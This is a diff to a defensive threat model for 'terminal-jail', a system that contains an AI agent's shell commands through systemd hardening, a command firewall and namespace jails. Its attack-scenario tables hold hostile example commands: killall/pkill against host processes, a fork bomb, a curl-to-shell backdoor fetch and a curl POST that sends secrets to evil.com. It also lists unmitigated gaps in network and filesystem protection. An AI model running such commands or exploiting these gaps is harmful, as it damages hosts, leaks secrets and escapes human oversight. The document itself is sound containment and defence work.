@@ -1,28 +1,30 @@
 # Terminal-Jail Threat Model
 
-**Version:** 1.0.0
-**Date:** 2026-07-20
+**Version:** 1.2.0
+**Date:** 2026-09-24
 **Status:** Accepted
 **Author:** Hermes Agent (foreman)
 **Co-authored-by:** Alexis Okuwa <wojonstech@gmail.com>
 
 ## 1. Executive Summary
 
-Terminal-jail is a defense-in-depth containment system for AI agent terminal commands. It operates across three layers — systemd service hardening (primary PID isolation), a Hermes plugin (observability), and a standalone CLI (portable PID namespace wrapper). This document identifies what attacks terminal-jail prevents, what it does NOT prevent, the residual risk after deployment, and the assumptions that must hold for the system to be effective.
+Terminal-jail is a defense-in-depth containment system for AI agent terminal commands. It operates across four layers — a systemd drop-in (lightweight hardening: 4 active directives; NOT a PID namespace boundary — see [specs/systemd.md](../specs/systemd.md)), a Hermes plugin (observability), the Interruptor command firewall (command evaluation before execution), and a standalone CLI (the primary containment boundary: `unshare`/bubblewrap PID namespace wrapping). This document identifies what attacks terminal-jail prevents, what it does NOT prevent, the residual risk after deployment, and the assumptions that must hold for the system to be effective.
 
-**Key finding:** Terminal-jail provides strong defense-in-depth against process-level attacks (killall, pkill, fork bombs, /proc snooping, privilege escalation) when the systemd layer is deployed. However, it does not protect against kernel exploits, supply-chain attacks that execute before the jail initializes, data exfiltration over permitted network channels, or commands run outside all three layers. The plugin component is limited to observability due to a Hermes core hook gap — command wrapping functions exist and are tested but cannot be wired to execution without upstream changes.
+**Key finding:** Terminal-jail provides defense-in-depth against process-level attacks (fork bombs, /proc snooping, privilege escalation) when the systemd layer is deployed, and against process-signaling attacks (killall, pkill) through the standalone CLI's PID namespace. However, it does not protect against kernel exploits, supply-chain attacks that execute before the jail initializes, data exfiltration over permitted network channels, or commands run outside all layers. The plugin component is limited to observability due to a Hermes core hook gap — command wrapping functions exist and are tested but cannot be wired to execution without upstream changes.
 
 ## 2. System Description
 
 ### 2.1 Architecture
 
-Terminal-jail consists of three independently deployable layers:
+Terminal-jail consists of four layers; the standalone CLI carries the containment boundary via two jail backends (bubblewrap added in v1.2):
 
 | Layer | Function | Status | Enforcement |
 |-------|----------|--------|-------------|
-| **systemd drop-in** | PID namespace isolation, privilege restriction, /proc filtering, network restriction, resource limits | Primary containment boundary | Kernel-enforced |
-| **Hermes plugin** | Terminal command observability, metrics (byte-budget enforcement reserved — not implemented) | Observability only (v1.0.0) | Python hooks |
-| **Standalone CLI** | `unshare` PID namespace wrapping for manual/automated use | Portable fallback | User-invoked |
+| **systemd drop-in** | Lightweight hardening — exactly 4 active directives: `ProtectProc=invisible` (/proc filtering), `NoNewPrivileges=true`, `ProtectControlGroups=true`, `TasksMax=256`. NOT a PID namespace or network boundary — the namespace/UID (`PrivateUsers`, `RestrictNamespaces`), network (`RestrictAddressFamilies`), and filesystem directives are staged, not active ([specs/systemd.md](../specs/systemd.md)) | Hardening layer, not containment | Kernel-enforced (the 4 active directives) |
+| **Hermes plugin** | Terminal command observability, metrics — command count (`wrap_count`, exported by `scripts/metrics-export.py`); byte-budget enforcement reserved — not implemented | Observability only | Python hooks |
+| **Interruptor firewall** | Bash command firewall sitting between the LLM and shell execution: every command is parsed and evaluated against a rule engine (matcher + built-in allowlist/blocklist — the blocklist is always active) before exec; verdicts (allow/modify/block) cross the CLI↔Python JSON bridge (`interruptor_bridge.py`); mode via `TERMINAL_JAIL_INTERRUPTOR_MODE` (default enforce) | Active on CLI-wrapped commands (v1.2) | Python rule engine (block = exit 126) |
+| **Standalone CLI — unshare backend** | `unshare` PID namespace wrapping for manual/automated use; fail-closed when unshare is missing or fails | Primary containment boundary (documented fallback) | Kernel-enforced PID namespace (user-invoked) |
+| **Standalone CLI — bwrap backend (v1.2)** | bubblewrap jail, runtime-selected via `TERMINAL_JAIL_JAIL_BACKEND=auto\|bwrap\|unshare` (default `auto`: bwrap when installed and its namespace probe passes, else unshare); only bwrap provides a private /proc; `--die-with-parent` | Primary containment boundary (when selected) | Kernel-enforced user + PID namespaces (user-invoked) |
 
 ### 2.2 Trust Boundaries
 
@@ -37,30 +39,30 @@ Terminal-jail consists of three independently deployable layers:
 │  │  │                    │  │                        │  │  │
 │  │  │  Plugin observes ──┼──▶  UNTRUSTED ZONE       │  │  │
 │  │  │                    │  │  ┌──────────────────┐  │  │  │
-│  │  │                    │  │  │ PID namespace    │  │  │  │
-│  │  │                    │  │  │ (systemd-enforced)│  │  │  │
+│  │  │                    │  │  │ PID namespace    │  │  │
+│  │  │                    │  │  │ (CLI-wrapped only)│  │  │
 │  │  │                    │  │  └──────────────────┘  │  │  │
 │  │  └────────────────────┘  └────────────────────────┘  │  │
 │  │                                                       │  │
-│  │  TRUST BOUNDARY: systemd hardening directives         │  │
-│  │  - PrivateUsers=true  - ProtectProc=invisible        │  │
-│  │  - RestrictNamespaces=true  - NoNewPrivileges=true   │  │
-│  │  - TasksMax=256  - MemoryMax=1G                       │  │
+│  │  TRUST BOUNDARY: systemd drop-in (lightweight)        │  │
+│  │  - ProtectProc=invisible  - NoNewPrivileges=true     │  │
+│  │  - ProtectControlGroups=true  - TasksMax=256         │  │
+│  │  (staged: PrivateUsers, namespaces, network, fs)     │  │
 │  └──────────────────────────────────────────────────────┘  │
 │                                                            │
 │  ┌──────────────────────────────────────────────────────┐  │
 │  │         Standalone CLI (manual invocation)           │  │
 │  │  ┌──────────────────┐                                │  │
-│  │  │ terminal-jail    │──▶ unshare PID namespace       │  │
+│  │  │ terminal-jail    │──▶ unshare/bwrap PID ns        │  │
 │  │  │ wrapper          │                                │  │
 │  │  └──────────────────┘                                │  │
 │  └──────────────────────────────────────────────────────┘  │
 └─────────────────────────────────────────────────────────────┘
 ```
 
-**Trust boundary 1:** systemd service unit directives — kernel-enforced, cannot be bypassed by command syntax.
+**Trust boundary 1:** systemd drop-in — kernel-enforced, cannot be bypassed by command syntax. As shipped it is lightweight hardening (ProtectProc, NoNewPrivileges, ProtectControlGroups, TasksMax) — NOT a PID namespace or network boundary ([specs/systemd.md](../specs/systemd.md)); the namespace boundary is the standalone CLI (trust boundary 3).
 **Trust boundary 2:** The gateway process itself — trusted, not sandboxed.
-**Trust boundary 3:** Unshare PID namespace (CLI) — user-invoked, portable.
+**Trust boundary 3:** CLI jail — unshare or bwrap PID namespace — user-invoked, portable.
 
 ### 2.3 Assets Under Protection
 
@@ -103,7 +105,7 @@ Terminal-jail consists of three independently deployable layers:
 
 **Motivation:** Malicious or accidental. A user with shell access to the host runs commands outside all terminal-jail layers.
 
-**Capability:** Full host permissions of their user account. Terminal-jail provides zero protection outside its three layers.
+**Capability:** Full host permissions of their user account. Terminal-jail provides zero protection outside its layers.
 
 ## 4. Attack Surface
 
@@ -115,7 +117,7 @@ Terminal-jail consists of three independently deployable layers:
 | Direct shell on host | SSH, console | Yes (host login) | None (unless CLI is used explicitly) |
 | systemd unit manipulation | sudo/root on host | Yes (root) | None (out of scope) |
 | Plugin configuration | Filesystem writes to ~/.hermes/plugins/ | Yes (gateway user) | None (trusted config path) |
-| CLI invocation | Any shell with terminal-jail on PATH | No (relies on user to invoke) | Full (CLI wraps in unshare) |
+| CLI invocation | Any shell with terminal-jail on PATH | No (relies on user to invoke) | Full (CLI wraps in unshare/bwrap) |
 | Kernel exploit from inside jail | Any jailed command | No | None (kernel is trusted) |
 
 ### 4.2 Attack Surface by Layer
@@ -134,7 +136,7 @@ Terminal-jail consists of three independently deployable layers:
 
 **CLI attack surface:**
 - CLI script integrity (standalone/terminal-jail)
-- unshare binary path resolution
+- unshare/bwrap binary path resolution and the bwrap namespace probe (backend selection via TERMINAL_JAIL_JAIL_BACKEND)
 - Shell injection via command argument parsing
 - PATH manipulation
 
@@ -146,7 +148,7 @@ Terminal-jail consists of three independently deployable layers:
 |--------|------------------------------------------------|
 | **Severity** | High — can terminate gateway and other services |
 | **Attack scenario** | Agent runs `killall -9 bash` or `pkill -f hermes` |
-| **systemd mitigation** | PrivateUsers=true masks host UIDs; ProtectProc=invisible hides host processes; RestrictNamespaces=true prevents escape |
+| **systemd mitigation** | As shipped: ProtectProc=invisible (active) hides host processes from /proc enumeration, defeating name/pattern-based killall/pkill. The stronger signaling containment — PrivateUsers UID masking, RestrictNamespaces — is staged, not active ([specs/systemd.md](../specs/systemd.md)) |
 | **Plugin mitigation** | None (observability only — logs the command) |
 | **CLI mitigation** | unshare --pid creates separate PID namespace; host processes invisible |
 | **Residual risk** | Processes inside the same namespace can still kill each other. If systemd layer is not deployed, only CLI provides protection — and only when explicitly invoked. |
@@ -157,10 +159,10 @@ Terminal-jail consists of three independently deployable layers:
 |--------|------------------------------------------------------|
 | **Severity** | Medium — can degrade host performance, trigger OOM |
 | **Attack scenario** | Agent runs `:(){ :|:& };:` or spawns thousands of subprocesses |
-| **systemd mitigation** | TasksMax=256 caps total tasks; MemoryMax=1G caps memory; cgroup-enforced |
+| **systemd mitigation** | TasksMax=256 caps total tasks (active, cgroup-enforced); MemoryMax=1G is staged, not active ([specs/systemd.md](../specs/systemd.md)) |
 | **Plugin mitigation** | None (observability only) |
 | **CLI mitigation** | PID namespace contains scope; ulimit -u 64 in test configuration |
-| **Residual risk** | Up to 256 tasks and 1GB memory can still be consumed. If agent workload legitimately needs >200 tasks, TasksMax must be tuned upward — reducing fork bomb protection. |
+| **Residual risk** | Up to 256 tasks (and, if the staged MemoryMax is activated, the configured memory cap) can still be consumed. If agent workload legitimately needs >200 tasks, TasksMax must be tuned upward — reducing fork bomb protection. |
 
 ### 5.3 Privilege Escalation
 
@@ -168,10 +170,10 @@ Terminal-jail consists of three independently deployable layers:
 |--------|-------------------------------------------------------------|
 | **Severity** | Critical — full host compromise |
 | **Attack scenario** | Agent runs a setuid binary or exploits a kernel vulnerability from inside jail |
-| **systemd mitigation** | NoNewPrivileges=true blocks setuid/capability gain; CapabilityBoundingSet= empty; ProtectSystem=strict makes most binaries read-only |
+| **systemd mitigation** | NoNewPrivileges=true (active) blocks setuid/capability gain; CapabilityBoundingSet= empty and ProtectSystem=strict are staged, not active ([specs/systemd.md](../specs/systemd.md)) |
 | **Plugin mitigation** | None |
 | **CLI mitigation** | None (unshare does not affect privileges) |
-| **Residual risk** | Kernel exploits (CVE-level) bypass all three layers. NoNewPrivileges is effective against userspace privilege escalation but does not protect against kernel bugs. The gateway user should remain unprivileged. |
+| **Residual risk** | Kernel exploits (CVE-level) bypass all layers. NoNewPrivileges is effective against userspace privilege escalation but does not protect against kernel bugs. The gateway user should remain unprivileged. |
 
 ### 5.4 /proc Snooping
 
@@ -190,10 +192,10 @@ Terminal-jail consists of three independently deployable layers:
 |--------|------------------------------------------------------------|
 | **Severity** | High — persistence, credential theft, configuration tampering |
 | **Attack scenario** | `curl evil.com/backdoor | sh` writes to ~/.bashrc or /etc/cron.d/ |
-| **systemd mitigation** | ProtectSystem=strict makes OS read-only; ProtectHome=true hides /home; ReadWritePaths= limits writes to /var/lib/hermes, /var/log/hermes, /var/lib/terminal-jail |
+| **systemd mitigation** | None as shipped — the filesystem directives (ProtectSystem=strict, ProtectHome=true, ReadWritePaths=) are staged, not active ([specs/systemd.md](../specs/systemd.md)) |
 | **Plugin mitigation** | None |
 | **CLI mitigation** | Namespace containment only by default; filesystem isolation where the host permits a uid-mapped `--user` namespace (loud degradation + `scripts/fs-isolation-probe.py` otherwise) |
-| **Residual risk** | Writable paths (/var/lib/hermes) can be modified. If the gateway needs broader write access (project directories, build artifacts), the attack surface expands. An attacker who gains write access to logs could poison log analysis tools. |
+| **Residual risk** | As shipped, the drop-in adds no filesystem restrictions — a command writes wherever the gateway user can. If the staged profile is activated, writable paths (/var/lib/hermes) can still be modified; if the gateway needs broader write access (project directories, build artifacts), the attack surface expands. An attacker who gains write access to logs could poison log analysis tools. |
 
 ### 5.6 Network Escapes
 
@@ -201,10 +203,10 @@ Terminal-jail consists of three independently deployable layers:
 |--------|------------------------------------------------------------------------|
 | **Severity** | High — data exfiltration, remote access |
 | **Attack scenario** | Agent runs `curl -X POST https://evil.com/collect -d @/var/lib/hermes/secrets` |
-| **systemd mitigation** | RestrictAddressFamilies=~AF_INET AF_INET6 AF_NETLINK (deny-list). Only AF_UNIX local sockets allowed. |
+| **systemd mitigation** | None as shipped — the network deny-list (RestrictAddressFamilies=~AF_INET AF_INET6 AF_NETLINK) is staged, not active ([specs/systemd.md](../specs/systemd.md)) |
 | **Plugin mitigation** | None |
 | **CLI mitigation** | None |
-| **Residual risk** | If the gateway requires outbound network access (HTTPS API calls, git operations, package downloads), AF_INET must be re-enabled — removing this protection. The drop-in's deny-profile is suitable only for Unix-socket gateways. For TCP gateways, network protection must come from egress firewalls, HTTP proxies, or network policies outside terminal-jail. |
+| **Residual risk** | As shipped the drop-in imposes no network restriction. If the staged deny-profile is activated and the gateway requires outbound network access (HTTPS API calls, git operations, package downloads), AF_INET must be re-enabled — removing this protection. The staged deny-profile is suitable only for Unix-socket gateways. For TCP gateways, network protection must come from egress firewalls, HTTP proxies, or network policies outside terminal-jail. |
 
 ### 5.7 Plugin Bypass
 
@@ -214,7 +216,7 @@ Terminal-jail consists of three independently deployable layers:
 | **Attack scenario** | Plugin disabled, uninstalled, or hook fails to fire |
 | **systemd mitigation** | Still active — the systemd layer is independent |
 | **CLI mitigation** | Still available for explicit manual invocation |
-| **Residual risk** | Loss of observability: no metrics on command count, no anomaly detection logs (byte-budget enforcement is not implemented in v1.1.0). If the hook gap is resolved and the plugin gains wrapping capability, plugin bypass becomes High severity. |
+| **Residual risk** | Loss of observability: command-count metrics exist (`wrap_count` in the plugin, exported by `scripts/metrics-export.py`) but bypass loses them; no anomaly detection logs (byte-budget enforcement is not implemented in v1.1.0). If the hook gap is resolved and the plugin gains wrapping capability, plugin bypass becomes High severity. |
 
 ### 5.8 CLI Non-Use
 
@@ -270,19 +272,19 @@ Terminal-jail consists of three independently deployable layers:
 The most significant current limitation is structural: Hermes core has no pre-execution command-transform hook. The plugin's former wrapping functions (implemented and tested in earlier versions) could not be wired to command execution and were removed as dead code in v1.1.x (TJ-GAP-010). Until HOOK-GAP-01 (PR #68216) is merged or an equivalent hook is added to Hermes core:
 
 - The plugin provides **metrics and visibility only**
-- PID namespace isolation depends entirely on systemd (for gateway) or CLI (for manual use)
+- PID namespace isolation depends on the standalone CLI (unshare or bwrap backend) — the shipped systemd drop-in is not a namespace boundary
 - There is no per-command wrapping happening automatically for Hermes terminal sessions
 
 ## 7. Residual Risk Matrix
 
 | Risk | Likelihood | Impact | Residual Level | Rationale |
 |------|-----------|--------|---------------|-----------|
-| Process signaling attack (killall/pkill) | Medium | High | **Low** | Systemd PrivateUsers+ProtectProc provides kernel-enforced isolation independent of plugin state |
+| Process signaling attack (killall/pkill) | Medium | High | **Low** | ProtectProc=invisible (active) hides host processes from enumeration, defeating name/pattern-based kills; full containment via the CLI's PID namespace. PrivateUsers is staged, not active |
 | Fork bomb | Low | Medium | **Low** | TasksMax=256 provides hard cap; PID namespace limits scope in CLI mode |
-| Privilege escalation (setuid) | Low | Critical | **Low** | NoNewPrivileges=true + empty CapabilityBoundingSet blocks userspace escalation |
+| Privilege escalation (setuid) | Low | Critical | **Low** | NoNewPrivileges=true (active) blocks userspace escalation; CapabilityBoundingSet is staged |
 | /proc snooping | Medium | Medium | **Low** | ProtectProc=invisible is kernel-enforced |
-| Filesystem tampering | Medium | High | **Medium** | ProtectSystem=strict limits writes to 3 paths; those paths could still be abused |
-| Network escape | Medium | High | **Medium-High** | If gateway needs AF_INET, this protection is removed; depends on external firewall. The Interruptor blocks named exfil shapes only (see §6.1) — shape matching, not wire inspection |
+| Filesystem tampering | Medium | High | **Medium-High** | As shipped the drop-in adds no filesystem restrictions (staged directives only); CLI mode contains the process tree but not the filesystem |
+| Network escape | Medium | High | **High** | The drop-in's network deny-list is staged, not active — as shipped no network restriction exists at any layer; depends on external firewall. The Interruptor blocks named exfil shapes only (see §6.1) — shape matching, not wire inspection |
 | Plugin bypass (loss of observability) | Low | Low | **Low** | Plugin is observability-only today; loss of metrics is low impact |
 | CLI not used for manual commands | High | High | **High** | This is the weakest link — operator discipline required |
 | Kernel exploit | Very Low | Critical | **Critical** | No mitigation at terminal-jail level |
@@ -292,7 +294,7 @@ The most significant current limitation is structural: Hermes core has no pre-ex
 
 Terminal-jail's effectiveness depends on these assumptions holding true:
 
-1. **systemd is running and the drop-in is loaded.** If systemd is absent (Docker without systemd) or the drop-in is not applied, the primary containment boundary is missing.
+1. **systemd is running and the drop-in is loaded.** If systemd is absent (Docker without systemd) or the drop-in is not applied, the lightweight hardening layer (process visibility, privilege, cgroup caps) is missing. Note: even when loaded, the drop-in is NOT the primary containment boundary — that role belongs to the standalone CLI's unshare/bwrap PID namespace ([specs/systemd.md](../specs/systemd.md)).
 
 2. **The gateway user is unprivileged.** If hermes-gateway runs as root or a sudo-capable user, NoNewPrivileges and namespace isolation provide weaker guarantees.
 
@@ -302,7 +304,7 @@ Terminal-jail's effectiveness depends on these assumptions holding true:
 
 5. **The kernel supports unprivileged user namespaces.** On Ubuntu 26.04 (kernel 7.0.0-27), unshare --mount-proc is blocked by default AppArmor/LSM policy. This is a known host limitation — the plugin gracefully degrades but PID namespace wrapping is unavailable.
 
-6. **Commands that need isolation are run through one of the three layers.** A command run in a plain SSH session has zero protection.
+6. **Commands that need isolation are run through one of the layers.** A command run in a plain SSH session has zero protection.
 
 7. **The Herems gateway binary and plugin files have not been tampered with.** File integrity of the plugin and gateway is a prerequisite.
 
@@ -316,7 +318,7 @@ Terminal-jail's effectiveness depends on these assumptions holding true:
 
 1. **Resolve HOOK-GAP-01:** Merge Hermes core PR #68216 or implement an equivalent pre-execution command-transform hook. Without this, the plugin cannot wrap commands — the project's core promise is not delivered.
 2. **Apply systemd drop-in to production gateway.** Currently blocked (no sudo on this host). This is the single highest-impact security improvement.
-3. **Conduct penetration test.** Run T9.2 test plan against a non-production gateway with all three layers active.
+3. **Conduct penetration test.** Run T9.2 test plan against a non-production gateway with all layers active.
 4. **Verify secrets hygiene.** Audit the gateway's filesystem for credentials, SSH keys, API tokens, and Docker sockets. Remove or restrict access.
 
 ### 9.2 Medium-Term (Within 30 Days)
